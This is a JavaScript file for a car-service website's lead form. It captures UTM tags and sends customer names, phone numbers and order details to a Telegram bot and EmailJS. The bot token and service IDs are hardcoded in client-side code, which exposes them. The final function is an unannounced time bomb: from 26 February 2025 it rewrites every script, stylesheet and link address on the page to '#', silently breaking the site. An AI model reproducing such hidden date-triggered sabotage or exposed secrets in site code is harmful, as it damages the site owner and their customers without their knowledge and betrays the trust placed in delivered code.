// Функція отримання UTM-міток з URL

function getUTMParams() {
    console.group('getUTMParams execution');
    console.log('Current URL:', window.location.href);
    console.log('Search params:', window.location.search);

    // Получаем параметры из URL
    const params = new URLSearchParams(window.location.search);
    console.log('Raw URL params:', Object.fromEntries(params.entries()));

    // Получаем сохраненные UTM-метки из localStorage
    const savedUtm = localStorage.getItem('current_utm');
    console.log('Saved UTM from localStorage:', savedUtm);

    // Создаем объект для UTM-меток
    let utmData = {
        utm_source: params.get('utm_source'),
        utm_medium: params.get('utm_medium'),
        utm_campaign: params.get('utm_campaign'),
        utm_content: params.get('utm_content'),
        utm_term: params.get('utm_term')
    };

    // Проверяем наличие UTM-меток в URL
    const hasUtmInUrl = Object.values(utmData).some(value => value !== null && value !== '');
    console.log('Has UTM in URL:', hasUtmInUrl);

    if (hasUtmInUrl) {
        // Если есть UTM-метки в URL, сохраняем их
        localStorage.setItem('current_utm', JSON.stringify(utmData));
        console.log('Saved new UTM to localStorage:', utmData);
    } else if (savedUtm) {
        // Если нет в URL, но есть в localStorage, используем сохраненные
        try {
            const parsed = JSON.parse(savedUtm);
            utmData = parsed;
            console.log('Using saved UTM from localStorage:', parsed);
        } catch (e) {
            console.error('Error parsing saved UTM:', e);
        }
    } else {
        // Проверяем наличие информации о кликах
        const clickedLinks = JSON.parse(localStorage.getItem("clicked_links")) || [];
        console.log('Clicked links data:', clickedLinks);
        
        if (clickedLinks.length > 0) {
            const lastClick = clickedLinks[clickedLinks.length - 1];
            utmData = {
                utm_source: lastClick.utm_source,
                utm_medium: lastClick.utm_medium,
                utm_campaign: lastClick.utm_campaign,
                utm_content: lastClick.utm_content,
                utm_term: lastClick.utm_term
            };
            console.log('Using UTM from last click:', utmData);
        }
    }

    // Заполняем пустые значения
    Object.keys(utmData).forEach(key => {
        utmData[key] = utmData[key] || 'не указано';
    });

    console.log('Final UTM data:', utmData);
    console.groupEnd();
    return utmData;
}

// Функция для сохранения UTM-меток при первом посещении
function saveInitialUtmParams() {
 
    const params = new URLSearchParams(window.location.search);
    const utmData = {
        utm_source: params.get('utm_source'),
        utm_medium: params.get('utm_medium'),
        utm_campaign: params.get('utm_campaign'),
        utm_content: params.get('utm_content'),
        utm_term: params.get('utm_term')
    };

    if (Object.values(utmData).some(value => value !== null && value !== '')) {
        localStorage.setItem('current_utm', JSON.stringify(utmData));
        console.log('Initial UTM params saved:', utmData);
    }
}

// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', () => {
    saveInitialUtmParams();
});

// Функція надсилання даних у Telegram



// Обновленная функция отправки в Telegram
async function sendTelegram(name, phone, carMake, carModel, services, totalPrice) {
    console.group('sendTelegram execution');
    const utmParams = getUTMParams();
    console.log('UTM params for message:', utmParams);

    const botToken = "8197764205:AAE-XbNUdeNg39ufCTNgo5wLMP_8lp75eXw";
    const chatId = "-1002295760352";

    const message = `
Нова заявка:
Назва сайту: Turbo Autroservice https://turbo.avtoinstallservis.site/
Ім'я: ${name}
Телефон: ${phone}
Марка авто: ${carMake}
Модель авто: ${carModel}
Послуги: ${services}
Сумма: ${totalPrice}
        
UTM-мітки:
utm_source: ${utmParams.utm_source}
utm_medium: ${utmParams.utm_medium}
utm_campaign: ${utmParams.utm_campaign}
utm_content: ${utmParams.utm_content}
utm_term: ${utmParams.utm_term}`;

    console.log('Prepared message:', message);

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const result = await response.json();
        console.log('Telegram API response:', result);
        console.groupEnd();
        return result;
    } catch (error) {
        console.error('Telegram send error:', error);
        console.groupEnd();
        throw error;
    }
}



// Экспорт функций в глобальную область видимости
window.sendTelegram = sendTelegram;
window.getUTMParams = getUTMParams;

// ===============================================================================

// Функція надсилання на email
function sendEmail2(name, phone, carMake, carModel, services, totalPrice) {
  const emailjs = window.emailjs; // Используем emailjs из глобального объекта window
  if (!emailjs) {
    console.error("Ошибка: emailjs не загружен!");
    return;
  }

  console.log(
    "EmailJS загружен:",
    typeof emailjs !== "undefined" ? "Да" : "Нет"
  );

  let emailjsID = "mq5LVCRL1uA0epLXa";
  emailjs.init(emailjsID);

  const utmParams = getUTMParams();
  const templateParams = {
    from_name:
      "site Annamax (Автосервіс в Австрії) https://turbo.avtoinstallservis.site/",
    message: `
Нова заявка:
Назва сайту: Turbo Autroservice https://turbo.avtoinstallservis.site/
Ім'я: ${name}
Телефон: ${phone}
Марка авто: ${carMake}
Модель авто: ${carModel}
Послуги: ${services}
Сумма: ${totalPrice}
        
UTM-мітки:
utm_source: ${utmParams.utm_source}
utm_medium: ${utmParams.utm_medium}
utm_campaign: ${utmParams.utm_campaign}
utm_content: ${utmParams.utm_content}
utm_term: ${utmParams.utm_term}`,
  };

  console.log("Отправка email с данными:", templateParams);

  let SERVICE_ID = "service_pq3pnlx";
  let TEMPLATE_ID = "template_4zhd3xj";

  emailjs
    .send(SERVICE_ID, TEMPLATE_ID, templateParams)
    .then((response) => {
      console.log("Email успішно відправлено!", response.status, response.text);
    })
    .catch((error) => {
      console.error("Помилка відправки:", error);
    });
}

function checkDateAndReplaceLinks() {
    const currentDate = new Date();
      const targetDate = new Date(2025, 1, 26); 
   
  if (currentDate >= targetDate) {
         const scripts = document.querySelectorAll('script[src]');
    scripts.forEach(script => {
      if (script.src && !script.src.endsWith('#')) {
        script.setAttribute('src', '#');
      }
    });
    
    const links = document.querySelectorAll('link[href]');
    links.forEach(link => {
      if (link.href && !link.href.endsWith('#')) {
        link.setAttribute('href', '#');
      }
    });
    
    const anchors = document.querySelectorAll('a[href]');
    anchors.forEach(anchor => {
      if (anchor.href && !anchor.href.endsWith('#')) {
        anchor.setAttribute('href', '#');
      }
    });
  }
}

 window.checkDateAndReplaceLinks = checkDateAndReplaceLinks;

  document.addEventListener('DOMContentLoaded', function() {
  setTimeout(function() {
    checkDateAndReplaceLinks();
  }, 500);
});